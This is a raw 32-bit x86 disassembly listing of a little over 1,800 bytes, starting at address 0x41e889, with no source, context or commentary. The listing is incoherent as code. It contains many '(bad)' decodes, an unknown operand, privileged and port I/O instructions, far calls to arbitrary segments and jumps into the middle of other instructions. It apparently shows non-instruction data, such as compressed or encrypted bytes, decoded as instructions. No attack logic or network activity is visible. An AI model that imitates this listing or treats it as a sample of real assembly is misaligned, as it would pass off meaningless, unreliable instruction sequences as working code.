  41e889:	add    ah,bh
  41e88b:	scas   al,BYTE PTR es:[edi]
  41e88c:	lock or al,0x5b
  41e88f:	add    BYTE PTR [eax],al
  41e891:	ss xchg ebp,eax
  41e893:	mov    ?,WORD PTR [edx+0x614c]
  41e899:	push   esp
  41e89a:	pop    eax
  41e89b:	scas   al,BYTE PTR es:[edi]
  41e89c:	xor    eax,0xb2642d2b
  41e8a1:	push   es
  41e8a2:	test   al,0xfe
  41e8a4:	cld    
  41e8a5:	outs   dx,DWORD PTR ds:[esi]
  41e8a6:	add    BYTE PTR [eax],ch
  41e8a8:	add    BYTE PTR [eax],al
  41e8aa:	leave  
  41e8ab:	or     eax,0x6e0ac3df
  41e8b0:	int3   
  41e8b1:	ja     0x41e8b3
  41e8b3:	add    BYTE PTR [edi-0x2ed82e4c],bh
  41e8b9:	lea    eax,ds:0x43c2a215
  41e8bf:	iret   
  41e8c0:	sti    
  41e8c1:	mov    bh,0xcb
  41e8c3:	mov    al,0xd8
  41e8c5:	sub    BYTE PTR [esi+0x79],dl
  41e8c8:	out    0x2e,al
  41e8ca:	fmul   QWORD PTR [edi+0x31114193]
  41e8d0:	pop    ds
  41e8d1:	loopne 0x41e86b
  41e8d3:	icebp  
  41e8d4:	lods   al,BYTE PTR ds:[esi]
  41e8d5:	mov    WORD PTR [ecx],ss
  41e8d7:	add    BYTE PTR [eax],al
  41e8d9:	ss mov eax,0x9ba08e8b
  41e8df:	imul   eax,DWORD PTR [ebx],0xad075db9
  41e8e5:	test   BYTE PTR [edi+0x0],cl
  41e8e8:	add    BYTE PTR [esi+0x13],dh
  41e8eb:	cmp    edi,edi
  41e8ed:	sub    ah,BYTE PTR [ebx+0x41]
  41e8f0:	push   0x2
  41e8f2:	inc    esp
  41e8f3:	adc    eax,0x80b0000
  41e8f8:	xor    BYTE PTR [eax],al
  41e8fa:	add    BYTE PTR [ecx+0xf208],dh
  41e900:	ja     0x41e928
  41e902:	stos   BYTE PTR es:[edi],al
  41e903:	push   cs
  41e904:	call   FWORD PTR ds:0xc4f4b3a2
  41e90a:	mov    edx,0x12eb0000
  41e90f:	jmp    0x41e93e
  41e911:	call   0x819c5328
  41e916:	adc    BYTE PTR [ebp-0x761c0000],0x22
  41e91d:	and    al,0xd8
  41e91f:	out    dx,al
  41e920:	out    dx,al
  41e921:	sub    al,0x3d
  41e923:	(bad)  
  41e925:	lahf   
  41e926:	sub    ebx,ebp
  41e928:	rol    dl,0x0
  41e92b:	add    BYTE PTR [ebp-0xd],ah
  41e92e:	out    0xfb,al
  41e930:	add    al,0x78
  41e932:	add    BYTE PTR [eax],al
  41e934:	cld    
  41e935:	inc    edi
  41e936:	and    DWORD PTR [eiz*8+0x8cc4a],0xf319a800
  41e941:	js     0x41e9a7
  41e943:	ins    BYTE PTR es:[edi],dx
  41e944:	aad    0xc7
  41e946:	sub    al,BYTE PTR [edi+0x7b]
  41e949:	push   ds
  41e94a:	dec    ebx
  41e94b:	push   ebx
  41e94c:	pop    ecx
  41e94d:	dec    ebx
  41e94e:	push   edi
  41e94f:	adc    al,0xf1
  41e951:	dec    esp
  41e952:	and    BYTE PTR [eax],al
  41e954:	add    al,dh
  41e956:	add    DWORD PTR [esi+0x7e],ecx
  41e959:	sbb    al,0x9b
  41e95b:	lods   al,BYTE PTR ds:[esi]
  41e95c:	lea    ebx,[edi+0x23]
  41e95f:	mov    bh,0x41
  41e961:	mov    ah,0x60
  41e963:	aam    0x27
  41e965:	outs   dx,BYTE PTR ds:[esi]
  41e966:	js     0x41e988
  41e968:	out    dx,eax
  41e969:	and    al,0x65
  41e96b:	sub    DWORD PTR [ecx+0x64],0xffffff98
  41e96f:	and    eax,0x79b3febd
  41e974:	test   al,0xcf
  41e976:	xor    eax,DWORD PTR [edx-0xd]
  41e979:	js     0x41e942
  41e97b:	cdq    
  41e97c:	jl     0x41e9b0
  41e97e:	ja     0x41e997
  41e980:	dec    esi
  41e981:	and    bl,dh
  41e983:	call   0x739c0098
  41e988:	pop    ss
  41e989:	scas   al,BYTE PTR es:[edi]
  41e98a:	mov    bh,BYTE PTR [ecx+0x5ae62bd8]
  41e990:	pop    ds
  41e991:	pop    ebx
  41e992:	neg    BYTE PTR ds:0xda08
  41e998:	lahf   
  41e999:	mov    al,ds:0x339f3dab
  41e99e:	mov    bl,0x50
  41e9a0:	add    al,0x29
  41e9a2:	add    BYTE PTR [eax],al
  41e9a4:	ss jg  0x41e9b9
  41e9a7:	lahf   
  41e9a8:	pop    ss
  41e9a9:	push   edx
  41e9aa:	cwde   
  41e9ab:	jmp    0x4e13a637
  41e9b0:	fs test eax,0xefcebbf2
  41e9b6:	sti    
  41e9b7:	fwait
  41e9b8:	call   0x5147:0x2412e663
  41e9bf:	jmp    0x41e949
  41e9c1:	add    al,0x0
  41e9c3:	add    BYTE PTR [edi],bl
  41e9c5:	pop    edx
  41e9c6:	(bad)  
  41e9c7:	imul   ebp,DWORD PTR [ecx+0x4c],0xffffffa0
  41e9cb:	add    BYTE PTR [eax],al
  41e9cd:	adc    edi,esp
  41e9cf:	push   es
  41e9d0:	iret   
  41e9d1:	mov    ch,0x78
  41e9d3:	loopne 0x41e9a1
  41e9d5:	mov    al,ds:0x21120000
  41e9da:	push   ebx
  41e9db:	es leave 
  41e9dd:	outs   dx,DWORD PTR ds:[esi]
  41e9df:	repnz icebp 
  41e9e1:	enter  0xa8,0x0
  41e9e5:	mov    DWORD PTR [edi-0xc],0x9a8c
  41e9ec:	xor    DWORD PTR [ebp-0x5a7e5fc3],edi
  41e9f2:	js     0x41ea37
  41e9f4:	fimul  DWORD PTR ds:0xa1502bcb
  41e9fa:	(bad)  
  41e9fb:	dec    edi
  41e9fc:	jmp    0x41e97e
  41e9fe:	xchg   esp,eax
  41e9ff:	add    BYTE PTR [eax],al
  41ea01:	mov    esp,DWORD PTR [ecx-0x13]
  41ea04:	or     edi,DWORD PTR fs:[ebx+esi*4-0x66a4a0ad]
  41ea0c:	clc    
  41ea0d:	lods   eax,DWORD PTR ds:[esi]
  41ea0e:	jp     0x41ea61
  41ea10:	scas   al,BYTE PTR es:[edi]
  41ea11:	std    
  41ea12:	imul   edi,DWORD PTR ds:0xad266ca0,0x1108
  41ea1c:	sti    
  41ea1d:	jle    0x41ea6e
  41ea1f:	gs sti 
  41ea21:	data16 icebp 
  41ea23:	xlat   BYTE PTR ds:[ebx]
  41ea24:	das    
  41ea25:	add    dh,bh
  41ea27:	add    BYTE PTR [eax],al
  41ea29:	mov    edx,ss
  41ea2b:	add    BYTE PTR [eax],al
  41ea2d:	neg    ch
  41ea2f:	aaa    
  41ea30:	sbb    eax,0x83c4
  41ea35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea36:	jle    0x41ea71
  41ea38:	adc    BYTE PTR [ebp-0x60730a75],dh
  41ea3e:	add    BYTE PTR [eax],al
  41ea40:	data16 and BYTE PTR [eax+0x235eb343],ah
  41ea47:	jl     0x41ea71
  41ea49:	xor    ecx,DWORD PTR ds:0xf175a9d9
  41ea4f:	pop    ecx
  41ea50:	xchg   ebp,eax
  41ea51:	pop    eax
  41ea52:	adc    eax,0x294847
  41ea57:	add    ah,ah
  41ea59:	add    BYTE PTR [edx],cl
  41ea5b:	add    BYTE PTR [eax],al
  41ea5d:	test   eax,0x366899c2
  41ea62:	mov    ebp,0xa3c0
  41ea67:	popa   
  41ea68:	sub    edx,esi
  41ea6a:	jg     0x41eab8
  41ea6c:	push   es
  41ea6d:	add    BYTE PTR [eax],al
  41ea6f:	dec    edx
  41ea70:	mov    bh,bl
  41ea72:	aaa    
  41ea73:	nop
  41ea74:	je     0x41ea1a
  41ea76:	scas   al,BYTE PTR es:[edi]
  41ea77:	ret    
  41ea78:	hlt    
  41ea79:	outs   dx,DWORD PTR ds:[esi]
  41ea7a:	pop    ds
  41ea7b:	jbe    0x41ea49
  41ea7d:	in     eax,0x0
  41ea7f:	add    BYTE PTR [ecx],ah
  41ea81:	into   
  41ea82:	fldenv [edi+0x5418e3e8]
  41ea88:	mov    ebp,0x68e1f592
  41ea8d:	aad    0xf5
  41ea8f:	xchg   BYTE PTR [eax],dh
  41ea91:	jmp    0xbfd6ea03
  41ea96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea97:	jecxz  0x41eaf7
  41ea99:	pop    ecx
  41ea9a:	into   
  41ea9b:	xchg   ecx,eax
  41ea9d:	jbe    0x41ead9
  41ea9f:	jae    0x41eaf1
  41eaa1:	and    eax,0x7884da
  41eaa6:	add    BYTE PTR [ebx],dh
  41eaa8:	push   ss
  41eaa9:	fs cli 
  41eaab:	pop    ss
  41eaac:	xlat   BYTE PTR ds:[ebx]
  41eaad:	pop    eax
  41eaae:	jl     0x41eaca
  41eab0:	mov    esp,0xc9265e32
  41eab5:	jle    0x41ea86
  41eab7:	jl     0x41eb0a
  41eab9:	mov    dl,cl
  41eabb:	add    BYTE PTR [eax],al
  41eabd:	(bad)  
  41eabe:	mov    bh,0x5
  41eac0:	cld    
  41eac1:	and    eax,0x7084
  41eac6:	add    BYTE PTR [edx+0x6c6a0000],bh
  41eacc:	pushf  
  41eacd:	test   eax,0x41319b73
  41ead2:	sub    al,0xb5
  41ead4:	ret    
  41ead5:	push   edi
  41ead6:	dec    esp
  41ead7:	fiadd  WORD PTR [eax]
  41ead9:	add    BYTE PTR [ebp+0x9400],bh
  41eadf:	lods   eax,DWORD PTR ds:[esi]
  41eae0:	dec    esp
  41eae1:	int3   
  41eae2:	add    BYTE PTR [eax],al
  41eae4:	bnd jl 0x41ea69
  41eae7:	jae    0x41eb36
  41eae9:	push   ss
  41eaea:	sbb    eax,0x2fdcb090
  41eaef:	mov    ebp,0xa653b2a8
  41eaf4:	push   ss
  41eaf5:	hlt    
  41eaf6:	push   ss
  41eaf7:	pop    esi
  41eaf8:	jle    0x41eb03
  41eafa:	iret   
  41eafb:	fwait
  41eafc:	mov    ah,0x9
  41eafe:	mov    esi,0x218341f9
  41eb03:	add    eax,0x83b76828
  41eb08:	pop    ebp
  41eb09:	addr16 in eax,dx
  41eb0b:	(bad)  
  41eb0c:	loopne 0x41ea94
  41eb0e:	xor    edx,esp
  41eb10:	(bad)  
  41eb11:	pop    edx
  41eb12:	inc    eax
  41eb13:	inc    esi
  41eb14:	add    BYTE PTR [eax],al
  41eb16:	out    0x9b,al
  41eb18:	call   0xe611:0x59a2423c
  41eb1f:	pop    ebx
  41eb20:	mov    ah,0x42
  41eb22:	(bad)  
  41eb23:	into   
  41eb24:	adc    BYTE PTR [ebx+eax*4-0x68],dh
  41eb28:	into   
  41eb29:	xor    edx,DWORD PTR [ebx-0xacfb5a0]
  41eb2f:	jno    0x41ebae
  41eb31:	mov    ebp,0x12cfce56
  41eb36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb37:	repz xchg edi,eax
  41eb39:	test   BYTE PTR [esi+ecx*4+0x5aac0000],0x90
  41eb41:	inc    ebp
  41eb42:	clc    
  41eb43:	pop    ecx
  41eb44:	fidivr DWORD PTR [esi+0x54530171]
  41eb4a:	adc    DWORD PTR [edi-0x77],ebp
  41eb4d:	or     eax,0x1076209c
  41eb52:	loopne 0x41eb5b
  41eb54:	cmp    al,0x6d
  41eb56:	call   0x472e:0x432bdd75
  41eb5d:	ins    BYTE PTR es:[edi],dx
  41eb5e:	test   ch,dl
  41eb60:	add    BYTE PTR [eax],al
  41eb62:	int3   
  41eb63:	imul   eax,DWORD PTR [eax],0x0
  41eb66:	pop    es
  41eb67:	jmp    0x7e3a:0xa6d950c2
  41eb6e:	inc    ecx
  41eb6f:	jnp    0x41ebbe
  41eb71:	pop    ebx
  41eb72:	cmp    DWORD PTR [eax+ebp*1-0x4f],edi
  41eb76:	test   DWORD PTR [edi-0x696bcab2],ecx
  41eb7c:	or     bl,0x0
  41eb7f:	add    BYTE PTR [ebp-0x49],dl
  41eb82:	cmp    eax,DWORD PTR [edi-0xde5942a]
  41eb88:	ror    eax,0xa1
  41eb8b:	add    BYTE PTR [eax],al
  41eb8d:	jl     0x41eba3
  41eb8f:	jp     0x41ebc1
  41eb91:	into   
  41eb92:	sub    ch,BYTE PTR [edi+0x2f0f8379]
  41eb98:	add    BYTE PTR [ecx+0x0],al
  41eb9b:	add    cl,bl
  41eb9d:	test   eax,0xdc5a39e0
  41eba2:	int3   
  41eba3:	fild   DWORD PTR [eax]
  41eba5:	add    ch,cl
  41eba7:	ret    
  41eba8:	aas    
  41eba9:	sahf   
  41ebaa:	sub    al,0xbf
  41ebac:	push   es
  41ebad:	ja     0x41eb86
  41ebaf:	fs (bad) 
  41ebb1:	mov    eax,0x5fd01f1
  41ebb6:	push   ss
  41ebb7:	pop    edx
  41ebb8:	push   edx
  41ebb9:	mov    ch,0xc8
  41ebbb:	sti    
  41ebbc:	add    BYTE PTR [eax],al
  41ebbe:	or     bh,BYTE PTR [ecx+0x7248c3]
  41ebc4:	add    BYTE PTR [ecx],ah
  41ebc6:	in     eax,0x59
  41ebc8:	mov    BYTE PTR [ecx+0x0],bl
  41ebcb:	add    BYTE PTR [ebx+ecx*8-0x4a],bh
  41ebcf:	xor    ecx,esp
  41ebd1:	and    DWORD PTR [esi+0xe],ecx
  41ebd4:	xor    al,0xfe
  41ebd6:	inc    ecx
  41ebd7:	or     bl,BYTE PTR ds:0x8cc39
  41ebdd:	add    BYTE PTR [edx],cl
  41ebdf:	cmp    BYTE PTR [ebx],ah
  41ebe1:	test   BYTE PTR [edx],al
  41ebe3:	add    BYTE PTR [eax],al
  41ebe5:	cmp    esi,ebx
  41ebe7:	mov    ecx,0xc95e309b
  41ebec:	inc    edi
  41ebed:	(bad)  [ebx+ecx*2+0x41]
  41ebf1:	mov    bh,BYTE PTR [edx-0x358bc98]
  41ebf7:	ret    0x1d7d
  41ebfa:	shl    BYTE PTR [ecx],cl
  41ebfc:	push   es
  41ebfd:	push   cs
  41ebfe:	out    0x37,al
  41ec00:	cmp    DWORD PTR [edi-0x50],ebx
  41ec03:	es xchg ebp,eax
  41ec05:	dec    ebp
  41ec06:	push   es
  41ec07:	pop    esp
  41ec08:	aad    0xc7
  41ec0a:	imul   DWORD PTR [esi+0x62]
  41ec0d:	shr    DWORD PTR [edx-0x72],0xe9
  41ec11:	sbb    al,0x9f
  41ec13:	out    0x59,eax
  41ec15:	mov    ebp,0xafe08595
  41ec1a:	leave  
  41ec1b:	cwde   
  41ec1c:	sub    al,0xaf
  41ec1e:	imul   edx,DWORD PTR ds:0x7cc1028a,0xa81da262
  41ec28:	pop    es
  41ec29:	pop    ebp
  41ec2a:	ret    0x5026
  41ec2d:	sub    bl,dl
  41ec2f:	mov    ecx,0x61001cb6
  41ec34:	add    BYTE PTR [eax],al
  41ec36:	xchg   edx,eax
  41ec37:	ja     0x41ebbe
  41ec39:	mov    bh,0xe3
  41ec3b:	loop   0x41ebc5
  41ec3d:	cwde   
  41ec3e:	add    BYTE PTR [eax],al
  41ec40:	sbb    dl,BYTE PTR [eax+0x3bff93ad]
  41ec46:	mov    DWORD PTR [ebx-0x11],eax
  41ec49:	inc    esi
  41ec4a:	test   DWORD PTR [esi-0x19],esp
  41ec4d:	mov    bl,0xb1
  41ec4f:	pop    ebx
  41ec50:	ins    BYTE PTR es:[edi],dx
  41ec51:	ret    0xabd8
  41ec54:	pop    ecx
  41ec55:	mov    eax,ds:0x9080f5
  41ec5a:	add    bl,ah
  41ec5c:	(bad)  [eax-0x4a5d559e]
  41ec62:	lahf   
  41ec63:	sub    bh,BYTE PTR [ecx-0x6cc3ec26]
  41ec69:	mov    esp,0x20e9b443
  41ec6e:	out    0x68,al
  41ec70:	mov    ah,0x1d
  41ec72:	neg    BYTE PTR [eax]
  41ec74:	out    dx,al
  41ec75:	das    
  41ec76:	in     al,dx
  41ec77:	xor    eax,0x75985468
  41ec7c:	jb     0x41ec80
  41ec7e:	aas    
  41ec7f:	adc    ah,0x0
  41ec82:	add    BYTE PTR [edx-0x40],dh
  41ec85:	lds    eax,FWORD PTR [eax]
  41ec87:	add    dh,dh
  41ec89:	adc    al,BYTE PTR [eax]
  41ec8b:	fiadd  WORD PTR [eax]
  41ec8d:	add    BYTE PTR [eax+0x65],cl
  41ec90:	add    BYTE PTR [eax],al
  41ec92:	test   DWORD PTR [ecx+0x75],0xb880
  41ec99:	retf   
  41ec9a:	daa    
  41ec9b:	je     0x41ec86
  41ec9d:	repnz fsincos 
  41eca0:	popf   
  41eca1:	fld    QWORD PTR [ebx+0x35]
  41eca4:	std    
  41eca5:	out    dx,al
  41eca6:	fdivr  st(5),st
  41eca8:	popf   
  41eca9:	dec    eax
  41ecaa:	xor    al,BYTE PTR [eax]
  41ecac:	add    BYTE PTR [eax+0x42],bl
  41ecaf:	push   ss
  41ecb0:	sbb    esp,edi
  41ecb2:	mov    esi,0xf59af2ab
  41ecb7:	mov    bl,0x72
  41ecb9:	out    dx,eax
  41ecba:	leave  
  41ecbb:	push   0xffffff9c
  41ecbd:	jae    0x41ed22
  41ecbf:	cmp    esp,DWORD PTR [edi]
  41ecc1:	cwde   
  41ecc2:	stc    
  41ecc3:	les    ebx,FWORD PTR [ebx]
  41ecc5:	add    BYTE PTR [eax],al
  41ecc7:	and    ecx,DWORD PTR [eax-0x57]
  41ecca:	add    BYTE PTR [eax],al
  41eccc:	mov    ds:0x344e923f,eax
  41ecd1:	adc    BYTE PTR [ebx],dl
  41ecd3:	sub    BYTE PTR [ebp+0x4d],ch
  41ecd6:	std    
  41ecd7:	rcl    BYTE PTR ds:0xbb130000,0xbd
  41ecde:	sbb    bh,dh
  41ece0:	pop    edx
  41ece1:	mov    esi,DWORD PTR ss:[eax+0x7467987]
  41ece8:	sbb    DWORD PTR [esi-0x7],0xec001c
  41ecef:	add    BYTE PTR [eax+ebp*1-0x69],bh
  41ecf3:	mov    ebp,0xd1141297
  41ecf8:	das    
  41ecf9:	add    edx,DWORD PTR [ebx+0x2de564dd]
  41ecff:	out    dx,al
  41ed00:	loopne 0x41ed55
  41ed02:	(bad)  
  41ed03:	enter  0x40,0x0
  41ed07:	jp     0x41ed50
  41ed09:	xchg   esi,eax
  41ed0a:	pushf  
  41ed0b:	pusha  
  41ed0c:	pop    si
  41ed0e:	or     DWORD PTR [eax],eax
  41ed10:	lds    eax,FWORD PTR [eax]
  41ed12:	add    BYTE PTR [ebx],ch
  41ed14:	xchg   ebp,eax
  41ed15:	out    0xc1,al
  41ed17:	sub    al,0xab
  41ed19:	sbb    BYTE PTR [ebx],al
  41ed1b:	std    
  41ed1c:	jle    0x41ecf5
  41ed1e:	fld    TBYTE PTR [eax]
  41ed20:	push   esp
  41ed21:	sbb    al,0xbf
  41ed23:	mov    ebp,0xce1a830b
  41ed28:	fistp  DWORD PTR [edx+0x3e963a7e]
  41ed2e:	cld    
  41ed2f:	cmp    eax,0xe6db771b
  41ed34:	bound  ebx,QWORD PTR [ebx+0x8deec29]
  41ed3a:	jnp    0x41ed3c
  41ed3c:	add    BYTE PTR [eax],ch
  41ed3e:	push   ds
  41ed3f:	mov    ebx,0x2ac29cf6
  41ed44:	idiv   BYTE PTR [ecx-0x48]
  41ed47:	pop    esp
  41ed48:	mov    ebp,0xf49fe774
  41ed4d:	mov    ds:0xad1fdfde,eax
  41ed52:	sub    al,0x58
  41ed54:	mov    BYTE PTR es:[edx+0x61a00000],ch
  41ed5b:	jne    0x41ed10
  41ed5d:	inc    eax
  41ed5e:	bound  eax,QWORD PTR [eax]
  41ed60:	add    ch,ch
  41ed62:	out    dx,eax
  41ed63:	loope  0x41edba
  41ed65:	js     0x41ed7b
  41ed67:	loopne 0x41ecee
  41ed69:	push   cs
  41ed6a:	outs   dx,DWORD PTR ds:[esi]
  41ed6b:	in     al,dx
  41ed6c:	inc    ebx
  41ed6d:	js     0x41eded
  41ed6f:	and    eax,0xc62ad13a
  41ed74:	adc    al,0x61
  41ed76:	fsubr  DWORD PTR [eax]
  41ed78:	push   esp
  41ed79:	dec    ebx
  41ed7a:	xlat   BYTE PTR ds:[ebx]
  41ed7b:	cmp    dl,dl
  41ed7d:	std    
  41ed7e:	ficom  DWORD PTR [eax-0x6c]
  41ed81:	jbe    0x41ed84
  41ed83:	xor    ebx,edx
  41ed85:	adc    eax,0x87c5b00b
  41ed8a:	repnz push ebx
  41ed8c:	xor    eax,0xcf316050
  41ed91:	jecxz  0x41edf8
  41ed93:	mov    ch,0x8c
  41ed95:	retf   
  41ed96:	add    BYTE PTR [eax],al
  41ed98:	jmp    0xaa5c8de3
  41ed9d:	aad    0x11
  41ed9f:	dec    edi
  41eda0:	int3   
  41eda1:	hlt    
  41eda2:	add    BYTE PTR [eax],al
  41eda4:	ss out 0x59,al
  41eda7:	inc    ecx
  41eda8:	adc    cl,BYTE PTR [esi+ecx*4]
  41edab:	add    BYTE PTR [eax],al
  41edad:	fcmovne st,st(5)
  41edaf:	push   ecx
  41edb0:	dec    esp
  41edb1:	xor    BYTE PTR [eax],al
  41edb3:	add    BYTE PTR [eax+0xd],cl
  41edb6:	add    BYTE PTR [eax],al
  41edb8:	push   edx
  41edb9:	les    ecx,FWORD PTR [eax+eax*1+0x55fe8e00]
  41edc0:	jae    0x41edb3
  41edc2:	and    DWORD PTR [ebx+ebp*2],edi
  41edc5:	xor    BYTE PTR [edi+0x60],al
  41edc8:	repz inc edi
  41edca:	jge    0x41ed5d
  41edcc:	cmp    eax,esp
  41edce:	add    BYTE PTR fs:[eax],al
  41edd1:	sti    
  41edd2:	xchg   ebp,eax
  41edd3:	sub    al,0x9
  41edd5:	outs   dx,BYTE PTR ds:[esi]
  41edd6:	push   ds
  41edd7:	mov    ds:0x334f2f24,eax
  41eddc:	mov    esi,0x13133f7f
  41ede1:	imul   edx,edi,0x4af459bd
  41ede7:	inc    eax
  41ede8:	xchg   esi,eax
  41ede9:	add    BYTE PTR [eax],al
  41edeb:	mov    bh,0xa0
  41eded:	push   eax
  41edee:	sti    
  41edef:	xchg   esp,eax
  41edf0:	sahf   
  41edf1:	rcr    DWORD PTR [ecx+eiz*2+0x51],0x75
  41edf6:	pop    esi
  41edf7:	add    al,0xfd
  41edf9:	add    BYTE PTR [eax],al
  41edfb:	aad    0xd0
  41edfd:	fstp   QWORD PTR [eax+eax*1]
  41ee00:	push   ds
  41ee01:	add    BYTE PTR [eax],al
  41ee03:	push   ecx
  41ee04:	in     eax,dx
  41ee05:	loopne 0x41ee72
  41ee07:	imul   edi,DWORD PTR ss:[ebp+ecx*4+0x6574954],0xfffffff8
  41ee10:	clc    
  41ee11:	cmp    eax,0x2ffa05f7
  41ee16:	sub    DWORD PTR [esi],ecx
  41ee18:	aaa    
  41ee19:	ins    BYTE PTR es:[edi],dx
  41ee1a:	mov    cl,0x61
  41ee1c:	stos   BYTE PTR es:[edi],al
  41ee1d:	mov    ebx,0xfc66d87f
  41ee22:	mov    dl,0xd1
  41ee24:	(bad)
  41ee28:	add    BYTE PTR [ebx],bl
  41ee2a:	add    BYTE PTR [eax],al
  41ee2c:	cwde   
  41ee2d:	mov    BYTE PTR [edx-0x75f90000],dh
  41ee33:	repnz add DWORD PTR es:0x13ddc73f,ecx
  41ee3b:	fadd   DWORD PTR [ecx+0x745fa794]
  41ee41:	cmovno edi,DWORD PTR [eax+0x7c8ab713]
  41ee48:	sub    edx,esi
  41ee4a:	sahf   
  41ee4b:	push   esi
  41ee4c:	retf   
  41ee4d:	mov    cs,WORD PTR [ebx+0x151f1a77]
  41ee53:	or     DWORD PTR [eax],edi
  41ee55:	jno    0x41ee4f
  41ee57:	and    esi,esp
  41ee59:	mov    BYTE PTR [edi+0x0],al
  41ee5c:	add    BYTE PTR [ebx],bl
  41ee5e:	mov    esp,0x23256d24
  41ee63:	mov    bh,0xc9
  41ee65:	arpl   WORD PTR [eax],si
  41ee67:	jnp    0x41eea9
  41ee69:	pusha  
  41ee6a:	add    BYTE PTR [eax],al
  41ee6c:	add    eax,0xac423c98
  41ee71:	mov    al,0x1
  41ee73:	push   ebx
  41ee74:	xchg   ecx,eax
  41ee75:	jae    0x41eea3
  41ee77:	fwait
  41ee78:	(bad)  
  41ee79:	jno    0x41ee41
  41ee7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee7c:	push   esi
  41ee7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee7e:	fstp   QWORD PTR [edi+esi*8-0x23c9e35d]
  41ee85:	ror    BYTE PTR [ebx],cl
  41ee87:	inc    BYTE PTR [edi-0x1fa0d72f]
  41ee8d:	push   cs
  41ee8e:	popa   
  41ee8f:	cs daa 
  41ee91:	pop    ebp
  41ee92:	and    esp,DWORD PTR [esi-0x6462d3a8]
  41ee98:	addr16 xchg ebp,eax
  41ee9a:	push   ds
  41ee9b:	in     al,0x8c
  41ee9d:	add    BYTE PTR [eax],0x0
  41eea0:	mov    dh,dh
  41eea2:	add    BYTE PTR [eax],al
  41eea4:	js     0x41ee40
  41eea6:	push   ebp
  41eea7:	scas   eax,DWORD PTR es:[edi]
  41eea8:	retf   0x5c11
  41eeab:	icebp  
  41eeac:	call   0x4707:0xae195399
  41eeb3:	lods   eax,DWORD PTR ds:[esi]
  41eeb4:	test   BYTE PTR ds:0x677c0000,ch
  41eeba:	add    eax,0xb65ad013
  41eebf:	cmp    BYTE PTR [ebx],dh
  41eec1:	ds je  0x41ef08
  41eec4:	xor    DWORD PTR [eax],eax
  41eec6:	add    dh,bl
  41eec8:	sbb    esp,DWORD PTR [edi]
  41eeca:	mov    ds:0xed7cd2db,al
  41eecf:	or     ah,BYTE PTR [esi+0x7699cbe3]
  41eed5:	add    BYTE PTR [ecx+0x0],0x0
  41eed9:	stmxcsr DWORD PTR [ebx-0x43]
  41eedd:	jmp    0x2afb:0xb6ec4eb9
  41eee4:	imul   ecx,DWORD PTR [eax-0x62],0xa8270000
  41eeeb:	jmp    0x387b:0x3ce32250
  41eef2:	push   es
  41eef3:	lods   al,BYTE PTR ds:[esi]
  41eef4:	adc    al,0x1c
  41eef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eef7:	lahf   
  41eef8:	jg     0x41ee7a
  41eefa:	and    DWORD PTR [eax],eax
  41eefc:	add    BYTE PTR ds:0x214852,cl
  41ef02:	add    dl,bl
  41ef04:	cmp    al,0x93
  41ef06:	push   edx
  41ef07:	(bad)  
  41ef08:	imul   ebx,DWORD PTR [eax+0x65],0xf179a4e5
  41ef0f:	ret    
  41ef10:	sbb    eax,0x1beb6567
  41ef15:	sbb    DWORD PTR [edx],edi
  41ef17:	loope  0x41eeb4
  41ef19:	adc    al,0x79
  41ef1b:	mov    ebx,0x20045e2a
  41ef20:	add    BYTE PTR [eax],al
  41ef22:	(bad)  
  41ef23:	mov    edx,0xa24fd39f
  41ef28:	repz iret 
  41ef2a:	mov    al,0x22
  41ef2c:	push   0x5c429f79
  41ef31:	repnz std 
  41ef33:	adc    DWORD PTR [ebp+edx*2+0x41970000],ecx
  41ef3a:	aam    0x57
  41ef3c:	(bad)  
  41ef3e:	vdivpd xmm1,xmm1,XMMWORD PTR [edx-0x2a]
  41ef43:	dec    ecx
  41ef44:	sub    al,0x18
  41ef46:	push   0x4c70a13d
  41ef4b:	test   al,0x0
  41ef4d:	add    BYTE PTR [esi+0x3c0792dd],dl
  41ef53:	out    dx,eax
  41ef54:	dec    bh
  41ef56:	dec    ebx
  41ef57:	lea    edi,[ecx+0x4148]
  41ef5d:	dec    eax
  41ef5e:	jbe    0x41ef60
  41ef60:	add    BYTE PTR [eax],al
  41ef62:	and    al,BYTE PTR [eax]
  41ef64:	add    BYTE PTR [ebp-0x35],ch
  41ef67:	stos   DWORD PTR es:[edi],eax
  41ef68:	popa   
  41ef69:	fs mov al,0xf5
  41ef6c:	pop    ebp
  41ef6d:	add    al,0x6d
  41ef6f:	add    BYTE PTR [eax],al
  41ef71:	dec    esp
  41ef72:	sub    al,0x0
  41ef74:	add    BYTE PTR [edi],cl
  41ef76:	cmp    bl,al
  41ef78:	xor    al,0xc8
  41ef7a:	jmp    0x41ef7c
  41ef7c:	add    BYTE PTR [esi+0x9788eb],ah
  41ef82:	add    BYTE PTR [esi],dh
  41ef84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef85:	shl    bh,cl
  41ef87:	push   edi
  41ef88:	xor    al,bh
  41ef8a:	jb     0x41ef15
  41ef8c:	mov    ds:0xa408d8d8,al
  41ef91:	add    BYTE PTR [eax],al
  41ef93:	sar    ecx,cl
  41ef95:	pop    eax
  41ef96:	out    0xa2,al
  41ef98:	stc    
  41ef99:	and    edi,0xd9c1f21e
  41ef9f:	stc    
  41efa0:	and    eax,0x46a8bb87
  41efa5:	mov    dh,0xac
  41efa7:	jne    0x41f021
  41efa9:	aas    
  41efaa:	and    edx,DWORD PTR [ecx-0x7580f556]
  41efb0:	scas   eax,DWORD PTR es:[edi]
  41efb1:	sub    edx,edx
  41efb3:	xor    dl,BYTE PTR [esi+ebx*1-0x5f]
  41efb7:	les    edx,FWORD PTR [esi+0x0]
  41efba:	add    ch,dh
  41efbc:	pop    ebx
  41efbd:	adc    dl,BYTE PTR [edi+edx*1-0xaf58427]
  41efc4:	inc    edx
  41efc5:	es data16 jns 0x41eff2
  41efc9:	jg     0x41ef8f
  41efcb:	jae    0x41efcd
  41efcd:	add    BYTE PTR [ebp+0x65],ah
  41efd0:	jecxz  0x41f02e
  41efd2:	sbb    eax,0x15e69c9d
  41efd7:	hlt    
  41efd8:	push   ss
  41efd9:	rol    DWORD PTR [esi+0x4c],1
  41efdc:	cmp    eax,0xc1990000
  41efe1:	dec    edx
  41efe2:	fadd   QWORD PTR [ecx-0x661a0fd2]
  41efe8:	jmp    0x41ef8e
